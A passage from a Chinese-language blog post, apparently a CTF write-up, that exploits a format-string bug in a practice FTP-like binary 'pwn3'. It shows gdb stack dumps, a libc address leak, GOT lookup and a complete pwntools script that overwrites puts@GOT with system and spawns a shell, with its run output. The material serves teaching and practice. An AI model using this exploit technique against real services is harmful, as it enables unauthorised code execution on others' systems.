&lt;get_file+157&gt;:	jne0x8048853 &lt;get_file+93&gt;</span><br><span class="line">   0x8048895 &lt;get_file+159&gt;:	leaeax,[ebp-0xfc]</span><br><span class="line">   0x804889b &lt;get_file+165&gt;:	movDWORD PTR [esp],eax</span><br><span class="line">=&gt; 0x804889e &lt;get_file+168&gt;:	call   0x80484c0 &lt;printf@plt&gt;</span><br><span class="line">   0x80488a3 &lt;get_file+173&gt;:	leave  </span><br><span class="line">   0x80488a4 &lt;get_file+174&gt;:	ret</span><br><span class="line">   0x80488a5 &lt;get_command&gt;:	push   ebp</span><br><span class="line">   0x80488a6 &lt;get_command+1&gt;:	movebp,esp</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0xbfffef0c --&gt; 0x0 </span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbfffeef0 --&gt; 0xbfffef0c --&gt; 0x0 </span><br><span class="line">0004| 0xbfffeef4 --&gt; 0xbfffefd4 --&gt; 0xb7fb0071 --&gt; 0x2300e4d </span><br><span class="line">0008| 0xbfffeef8 --&gt; 0x4 </span><br><span class="line">0012| 0xbfffeefc --&gt; 0x0 </span><br><span class="line">0016| 0xbfffef00 --&gt; 0x0 </span><br><span class="line">0020| 0xbfffef04 --&gt; 0x0 </span><br><span class="line">0024| 0xbfffef08 --&gt; 0x0 </span><br><span class="line">0028| 0xbfffef0c --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804889e in get_file ()</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
+<p>然后stack 100查看栈上的内容，可以发现：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 100</span><br><span class="line">0000| 0xbfffeef0 --&gt; 0xbfffef0c --&gt; 0x0 </span><br><span class="line">0004| 0xbfffeef4 --&gt; 0xbfffefd4 --&gt; 0xb7fb0071 --&gt; 0x2300e4d </span><br><span class="line">0008| 0xbfffeef8 --&gt; 0x4 </span><br><span class="line">0012| 0xbfffeefc --&gt; 0x0 </span><br><span class="line">0016| 0xbfffef00 --&gt; 0x0 </span><br><span class="line">0020| 0xbfffef04 --&gt; 0x0 </span><br><span class="line">0024| 0xbfffef08 --&gt; 0x0 </span><br><span class="line">0028| 0xbfffef0c --&gt; 0x0 </span><br><span class="line">0032| 0xbfffef10 --&gt; 0x0 </span><br><span class="line">0036| 0xbfffef14 --&gt; 0x0 </span><br><span class="line">0040| 0xbfffef18 --&gt; 0x0 </span><br><span class="line">0044| 0xbfffef1c --&gt; 0x0 </span><br><span class="line">0048| 0xbfffef20 --&gt; 0x0 </span><br><span class="line">0052| 0xbfffef24 --&gt; 0x0 </span><br><span class="line">0056| 0xbfffef28 --&gt; 0x0 </span><br><span class="line">0060| 0xbfffef2c --&gt; 0x0 </span><br><span class="line">0064| 0xbfffef30 --&gt; 0x0 </span><br><span class="line">0068| 0xbfffef34 --&gt; 0x0 </span><br><span class="line">0072| 0xbfffef38 --&gt; 0x0 </span><br><span class="line">0076| 0xbfffef3c --&gt; 0x0 </span><br><span class="line">0080| 0xbfffef40 --&gt; 0x0 </span><br><span class="line">0084| 0xbfffef44 --&gt; 0x0 </span><br><span class="line">0088| 0xbfffef48 --&gt; 0x0 </span><br><span class="line">0092| 0xbfffef4c --&gt; 0x0 </span><br><span class="line">0096| 0xbfffef50 --&gt; 0x0 </span><br><span class="line">--More--(25/100)</span><br><span class="line">0100| 0xbfffef54 --&gt; 0x0 </span><br><span class="line">0104| 0xbfffef58 --&gt; 0x0 </span><br><span class="line">0108| 0xbfffef5c --&gt; 0x0 </span><br><span class="line">0112| 0xbfffef60 --&gt; 0x0 </span><br><span class="line">0116| 0xbfffef64 --&gt; 0x0 </span><br><span class="line">0120| 0xbfffef68 --&gt; 0x0 </span><br><span class="line">0124| 0xbfffef6c --&gt; 0x0 </span><br><span class="line">0128| 0xbfffef70 --&gt; 0x0 </span><br><span class="line">0132| 0xbfffef74 --&gt; 0x0 </span><br><span class="line">0136| 0xbfffef78 --&gt; 0x0 </span><br><span class="line">0140| 0xbfffef7c --&gt; 0x0 </span><br><span class="line">0144| 0xbfffef80 --&gt; 0x0 </span><br><span class="line">0148| 0xbfffef84 --&gt; 0x0 </span><br><span class="line">0152| 0xbfffef88 --&gt; 0x0 </span><br><span class="line">0156| 0xbfffef8c --&gt; 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">0160| 0xbfffef90 --&gt; 0xb7fbb5a0 --&gt; 0xfbad2288 </span><br><span class="line">0164| 0xbfffef94 --&gt; 0x804a060 --&gt; 0xb7fbb5a0 --&gt; 0xfbad2288 </span><br><span class="line">0168| 0xbfffef98 --&gt; 0xbfffefd8 --&gt; 0xbffff008 --&gt; 0xbffff058 --&gt; 0x0 </span><br><span class="line">0172| 0xbfffef9c --&gt; 0xb7e6513e (&lt;__isoc99_scanf+126&gt;:	addesp,0x10)</span><br><span class="line">0176| 0xbfffefa0 --&gt; 0xb7fbb5a0 --&gt; 0xfbad2288 </span><br><span class="line">0180| 0xbfffefa4 --&gt; 0x8048bc5 --&gt; 0x733325 (&apos;%3s&apos;)</span><br><span class="line">0184| 0xbfffefa8 --&gt; 0xbfffefe4 --&gt; 0x8048bc9 --&gt; 0x746567 (&apos;get&apos;)</span><br><span class="line">0188| 0xbfffefac --&gt; 0x0 </span><br><span class="line">0192| 0xbfffefb0 --&gt; 0x0 </span><br><span class="line">0196| 0xbfffefb4 --&gt; 0x0 </span><br><span class="line">--More--(50/100)</span><br><span class="line">0200| 0xbfffefb8 --&gt; 0xb7e4b0cb (&lt;_IO_vfprintf_internal+11&gt;:	addebx,0x16ff35)</span><br><span class="line">0204| 0xbfffefbc --&gt; 0xb7ffd940 (0xb7ffd940)</span><br><span class="line">0208| 0xbfffefc0 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">0212| 0xbfffefc4 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">0216| 0xbfffefc8 --&gt; 0xb7e650cb (&lt;__isoc99_scanf+11&gt;:	addebx,0x155f35)</span><br><span class="line">0220| 0xbfffefcc --&gt; 0x0 </span><br><span class="line">0224| 0xbfffefd0 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">0228| 0xbfffefd4 --&gt; 0xb7fb0071 --&gt; 0x2300e4d </span><br><span class="line">0232| 0xbfffefd8 --&gt; 0xbffff008 --&gt; 0xbffff058 --&gt; 0x0 </span><br><span class="line">0236| 0xbfffefdc --&gt; 0x80488d9 (&lt;get_command+52&gt;:	test   eax,eax)</span><br><span class="line">0240| 0xbfffefe0 --&gt; 0xbfffeffc --&gt; 0x0 </span><br><span class="line">0244| 0xbfffefe4 --&gt; 0x8048bc9 --&gt; 0x746567 (&apos;get&apos;)</span><br><span class="line">0248| 0xbfffefe8 --&gt; 0x3 </span><br><span class="line">0252| 0xbfffefec --&gt; 0x8048949 (&lt;print_prompt+18&gt;:	leave)</span><br><span class="line">0256| 0xbfffeff0 --&gt; 0x8048bd5 (&quot;ftp&gt;&quot;)</span><br><span class="line">0260| 0xbfffeff4 --&gt; 0x0 </span><br><span class="line">0264| 0xbfffeff8 --&gt; 0x1 </span><br><span class="line">0268| 0xbfffeffc --&gt; 0x0 </span><br><span class="line">0272| 0xbffff000 --&gt; 0xb7fbbd60 --&gt; 0xfbad2887 </span><br><span class="line">0276| 0xbffff004 --&gt; 0xb7fff918 --&gt; 0x0 </span><br><span class="line">0280| 0xbffff008 --&gt; 0xbffff058 --&gt; 0x0 </span><br><span class="line">0284| 0xbffff00c --&gt; 0x80486c9 (&lt;main+92&gt;:	jmp0x80486e5 &lt;main+120&gt;)</span><br><span class="line">0288| 0xbffff010 --&gt; 0xbffff024 (&quot;sysbdmin&quot;)</span><br><span class="line">0292| 0xbffff014 --&gt; 0x0 </span><br><span class="line">0296| 0xbffff018 --&gt; 0xb7fb9244 --&gt; 0xb7e21020 (&lt;_IO_check_libio&gt;:	)</span><br><span class="line">--More--(75/100)</span><br><span class="line">0300| 0xbffff01c --&gt; 0x8048471 (&lt;_init+9&gt;:	addebx,0x1b8f)</span><br><span class="line">0304| 0xbffff020 --&gt; 0x1 </span><br><span class="line">0308| 0xbffff024 (&quot;sysbdmin&quot;)</span><br><span class="line">0312| 0xbffff028 (&quot;dmin&quot;)</span><br><span class="line">0316| 0xbffff02c --&gt; 0x8048a00 (&lt;ask_password+42&gt;:	addal,0x24)</span><br><span class="line">0320| 0xbffff030 --&gt; 0x1 </span><br><span class="line">0324| 0xbffff034 --&gt; 0xbffff0f4 --&gt; 0xbffff2cb (&quot;/home/mask/format_pwn/CCTF/pwn3&quot;)</span><br><span class="line">0328| 0xbffff038 --&gt; 0xbffff0fc --&gt; 0xbffff2eb (&quot;XDG_VTNR=7&quot;)</span><br><span class="line">0332| 0xbffff03c --&gt; 0xb7e37c0b (&lt;__GI___cxa_atexit+27&gt;:	addesp,0x10)</span><br><span class="line">0336| 0xbffff040 --&gt; 0xb7fbb3dc --&gt; 0xb7fbc1e0 --&gt; 0x0 </span><br><span class="line">0340| 0xbffff044 --&gt; 0x8048288 --&gt; 0x77 (&apos;w&apos;)</span><br><span class="line">0344| 0xbffff048 --&gt; 0x8048aab (&lt;__libc_csu_init+11&gt;:	addebx,0x1555)</span><br><span class="line">0348| 0xbffff04c --&gt; 0x1 </span><br><span class="line">0352| 0xbffff050 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">0356| 0xbffff054 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">0360| 0xbffff058 --&gt; 0x0 </span><br><span class="line">0364| 0xbffff05c --&gt; 0xb7e21637 (&lt;__libc_start_main+247&gt;:	addesp,0x10)</span><br><span class="line">0368| 0xbffff060 --&gt; 0x1 </span><br><span class="line">0372| 0xbffff064 --&gt; 0xbffff0f4 --&gt; 0xbffff2cb (&quot;/home/mask/format_pwn/CCTF/pwn3&quot;)</span><br><span class="line">0376| 0xbffff068 --&gt; 0xbffff0fc --&gt; 0xbffff2eb (&quot;XDG_VTNR=7&quot;)</span><br><span class="line">0380| 0xbffff06c --&gt; 0x0 </span><br><span class="line">0384| 0xbffff070 --&gt; 0x0 </span><br><span class="line">0388| 0xbffff074 --&gt; 0x0 </span><br><span class="line">0392| 0xbffff078 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 </span><br><span class="line">0396| 0xbffff07c --&gt; 0xb7fffc04 --&gt; 0x0 </span><br><span class="line">--More--(100/100)</span><br></pre></td></tr></table></figure>
+<p>可以看到在栈上第91个位置存在<strong>libc_start_main+247,即</strong>libc_start_main_ret的地址，那么构造<code>printf(&quot;%91$p&quot;)</code>即可以将该地址的值泄露出来：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn/CCTF$ ./pwn3 </span><br><span class="line">Connected to ftp.hacker.server</span><br><span class="line">220 Serv-U FTP Server v6.4 for WinSock ready...</span><br><span class="line">Name (ftp.hacker.server:Rainism):rxraclhm</span><br><span class="line">welcome!</span><br><span class="line">ftp&gt;put</span><br><span class="line">please enter the name of the file you want to upload:test</span><br><span class="line">then, enter the content:%91$p</span><br><span class="line">ftp&gt;get</span><br><span class="line">enter the file name you want to get:test</span><br><span class="line">0xb7e21637ftp&gt;</span><br></pre></td></tr></table></figure>
+<p>验证了确实和调试时栈上显示的一样，那么</p>
+<p><code>__libc_start_main</code>的地址为:<code>0xb7e21637-f7(16进制的247） = 0xb7e21540</code></p>
+<p>这里使用一个工具libc-database，非常方便查找libc版本<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/libc-database$ ./find __libc_start_main 0xb7e21540</span><br><span class="line">ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu9_i386)</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64)</span><br></pre></td></tr></table></figure>
+<p>然后非常喜欢这个dump功能：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/libc-database$ ./find __libc_start_main 0xb7e21540</span><br><span class="line">ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu9_i386)</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu9_amd64)</span><br><span class="line">mask@mask-virtual-machine:~/libc-database$ ./dump libc6_2.23-0ubuntu9_i386</span><br><span class="line">offset___libc_start_main_ret = 0x18637</span><br><span class="line">offset_system = 0x0003ada0</span><br><span class="line">offset_dup2 = 0x000d6300</span><br><span class="line">offset_read = 0x000d5af0</span><br><span class="line">offset_write = 0x000d5b60</span><br><span class="line">offset_str_bin_sh = 0x15b9ab</span><br></pre></td></tr></table></figure>
+<p>很赞！！</p>
+<p>那么<br><code>system_addr</code> = <code>__libc_start_main_ret</code>-<code>0x18637</code>+<code>offset_system</code> =  <code>0xB7E43DA0</code></p>
+<p>验证一下：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print system</span><br><span class="line">$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e43da0 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>
+<p>然后就是要吧system_addr写到put地址处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn/CCTF$ objdump -R pwn3</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn3： 文件格式 elf32-i386</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE  VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT__gmon_start__</span><br><span class="line">0804a060 R_386_COPYstdin@@GLIBC_2.0</span><br><span class="line">0804a080 R_386_COPYstdout@@GLIBC_2.0</span><br><span class="line">0804a00c R_386_JUMP_SLOT   setbuf@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   strcmp@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   printf@GLIBC_2.0</span><br><span class="line">0804a018 R_386_JUMP_SLOT   bzero@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   fread@GLIBC_2.0</span><br><span class="line">0804a020 R_386_JUMP_SLOT   strcpy@GLIBC_2.0</span><br><span class="line">0804a024 R_386_JUMP_SLOT   malloc@GLIBC_2.0</span><br><span class="line">0804a028 R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a02c R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a030 R_386_JUMP_SLOT   exit@GLIBC_2.0</span><br><span class="line">0804a034 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a038 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br><span class="line">0804a03c R_386_JUMP_SLOT   strncmp@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+<p>然后开始编写exp:<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br></pre></td></tr></table></figure>
+<p>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(&apos;pwn3&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">pr = process(&apos;./pwn3&apos;) </span><br><span class="line"># pr = remote(&apos;120.27.155.82&apos;, 9000)</span><br><span class="line"></span><br><span class="line">username = &quot;rxraclhm&quot;</span><br><span class="line"></span><br><span class="line">pr.recvuntil(&quot;Name (ftp.hacker.server:Rainism):&quot;)</span><br><span class="line">pr.sendline(username)</span><br><span class="line"></span><br><span class="line"># 1 -&gt; get</span><br><span class="line"># 2 -&gt; put</span><br><span class="line"># 3 -&gt; dir</span><br><span class="line"># other -&gt; exit</span><br><span class="line"></span><br><span class="line">def put(pr, name, content):</span><br><span class="line">	pr.recvuntil(&quot;ftp&gt;&quot;)</span><br><span class="line">	pr.sendline(&apos;put&apos;) </span><br><span class="line">	pr.recvuntil(&quot;upload:&quot;)</span><br><span class="line">	pr.sendline(name)</span><br><span class="line">	pr.recvuntil(&quot;content:&quot;)</span><br><span class="line">	pr.sendline(content)</span><br><span class="line"></span><br><span class="line">def get(pr, name, num):</span><br><span class="line">	pr.recvuntil(&quot;ftp&gt;&quot;)</span><br><span class="line">	pr.sendline(&apos;get&apos;)</span><br><span class="line">	pr.recvuntil(&apos;get:&apos;)</span><br><span class="line">	pr.sendline(name)</span><br><span class="line">	return pr.recvn(num)</span><br><span class="line"></span><br><span class="line">def dir(pr):</span><br><span class="line">	pr.recvuntil(&quot;ftp&gt;&quot;)</span><br><span class="line">	pr.sendline(&apos;dir&apos;)</span><br><span class="line"></span><br><span class="line">plt_puts = elf.symbols[&apos;puts&apos;]</span><br><span class="line">print &apos;plt_puts= &apos; + hex(plt_puts)</span><br><span class="line">got_puts = elf.got[&apos;puts&apos;]</span><br><span class="line">print &apos;got_puts= &apos; + hex(got_puts)</span><br><span class="line"></span><br><span class="line"># /bin/sh</span><br><span class="line">put(pr, &apos;/sh&apos;, &apos;%8$s&apos; + p32(got_puts))</span><br><span class="line">text = get(pr, &apos;/sh&apos;, 4)</span><br><span class="line">puts_addr = u32(text)</span><br><span class="line">print &apos;puts_addr= &apos; + hex(puts_addr)</span><br><span class="line">system_addr = puts_addr - (libc.symbols[&apos;puts&apos;] - libc.symbols[&apos;system&apos;])</span><br><span class="line">print &apos;system_addr= &apos; + hex(system_addr)</span><br><span class="line"></span><br><span class="line">def foo(name, address, num):</span><br><span class="line">	num = num &amp; 0xff</span><br><span class="line">	if num == 0 : num == 0x100</span><br><span class="line">	payload = &apos;%&apos; + str(num) + &apos;c%10$hhn&apos;</span><br><span class="line">	payload = payload.ljust(12, &apos;A&apos;) </span><br><span class="line">	put(pr, name, payload + p32(address))</span><br><span class="line">	get(pr, name, 0)</span><br><span class="line"></span><br><span class="line">foo(&apos;n&apos;, got_puts, system_addr)</span><br><span class="line">foo(&apos;i&apos;, got_puts+1, system_addr&gt;&gt;8)</span><br><span class="line">foo(&apos;b&apos;, got_puts+2, system_addr&gt;&gt;16)</span><br><span class="line">foo(&apos;/&apos;, got_puts+3, system_addr&gt;&gt;24)</span><br><span class="line"></span><br><span class="line"># system(&quot;/bin/sh&quot;)</span><br><span class="line">dir(pr)</span><br><span class="line">pr.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/format_pwn/CCTF$ python exp.py </span><br><span class="line">[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.</span><br><span class="line">[*] &apos;/home/mask/format_pwn/CCTF/pwn3&apos;</span><br><span class="line">Arch: i386-32-little</span><br><span class="line">RELRO:Partial RELRO</span><br><span class="line">Stack:No canary found</span><br><span class="line">NX:   NX enabled</span><br><span class="line">PIE:  No PIE (0x8048000)</span><br><span class="line">[*] &apos;/home/mask/format_pwn/CCTF/libc.so&apos;</span><br><span class="line">Arch: i386-32-little</span><br><span class="line">RELRO:Partial RELRO</span><br><span class="line">Stack:Canary found</span><br><span class="line">NX:   NX enabled</span><br><span class="line">PIE:  PIE enabled</span><br><span class="line">[+] Starting local process &apos;./pwn3&apos;: pid 2269</span><br><span class="line">plt_puts= 0x8048510</span><br><span class="line">got_puts= 0x804a028</span><br><span class="line">puts_addr= 0xb7e68ca0</span><br><span class="line">system_addr= 0xb7e43da0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(mask) gid=1000(mask) 组=1000(mask),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">$ whoami</span><br><span class="line">mask</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/17/Hello-world/" rel="next" title="Hello_world">
+                <i class="fa fa-chevron-left"></i> Hello_world
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/17/Linux下简单的栈溢出/" rel="prev" title="Linux下简单的栈溢出">
+                Linux下简单的栈溢出 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Mask</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-基础知识"><span class="nav-number">1.</span> <span class="nav-text">0x00 基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞的触发"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞的触发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-实例分析"><span class="nav-number">3.</span> <span class="nav-text">0x02 实例分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mask</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
